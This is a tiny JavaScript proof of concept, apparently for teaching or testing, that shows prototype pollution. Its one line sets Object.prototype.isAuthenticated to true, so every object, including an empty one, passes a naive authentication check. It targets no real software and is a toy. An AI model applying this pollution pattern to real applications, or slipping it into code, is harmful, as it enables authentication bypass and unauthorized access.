// ================================================
// 🚨 Sl0ppyR00t Auth-Bypass-Testing PoC 
// Demonstrates prototype pollution via Auth-Bypass
// Author   : phoogeveen
// AKA      : x0xr00t 
// ================================================

// Inject an "isAuthenticated" property into Object.prototype
Object.prototype.isAuthenticated = true;

// Now, ALL objects inherit this property, bypassing auth checks
console.log({}.isAuthenticated); // Output: true (even for unauthenticated users!)
